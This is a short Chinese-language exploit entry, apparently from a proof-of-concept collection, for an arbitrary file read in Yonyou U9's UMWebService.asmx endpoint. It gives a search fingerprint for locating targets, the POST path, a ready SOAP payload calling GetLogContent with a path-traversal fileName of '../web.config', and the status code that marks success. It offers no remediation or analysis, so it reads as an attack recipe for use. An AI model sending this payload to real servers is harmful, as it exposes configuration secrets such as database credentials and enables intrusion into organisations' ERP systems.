# 用友U9UMWebService.asmx任意文件读取

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="logo-u9.png"`
- **请求**：`POST /u9/OnLine/UMWebService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetLogContent xmlns="http://tempuri.org/">
<fileName>../web.config</fileName>
</GetLogContent>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200